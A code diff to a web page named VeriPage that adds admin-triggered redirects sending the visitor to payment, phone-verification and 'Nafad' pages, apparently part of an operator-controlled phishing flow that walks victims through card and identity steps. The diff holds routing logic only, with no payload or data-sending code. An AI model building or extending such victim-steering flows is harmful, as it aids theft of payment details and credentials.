@@ -112,15 +112,26 @@ export default function VeriPage() {
         setError("")
       }
 
-      // Handle navigation based on currentStep (only if we're not already processing)
+      // Handle navigation based on currentStep (admin redirects)
       if (step && !hasRedirected.current) {
         if (step === "_t3") {
           // Already on step2, this means we just updated it - don't redirect
         } else if (step === "_t2") {
-          // This is our page, don't redirect
+          // This is our page - don't redirect
+        } else if (step === "_st1") {
+          // Admin wants to redirect to check/payment page
+          hasRedirected.current = true
+          router.push("/check")
+        } else if (step === "phone") {
+          // Admin wants to skip to phone verification
+          hasRedirected.current = true
+          router.push("/step5")
+        } else if (step === "_t6") {
+          // Admin wants to skip to Nafad page
+          hasRedirected.current = true
+          router.push("/step4")
         }
-        // Note: We intentionally do NOT redirect based on other currentStep values
-        // when first loading the page to prevent random redirects
+        // Note: We intentionally do NOT redirect based on "home" to prevent random redirects
       }
 
       // Stop loading once we have valid data
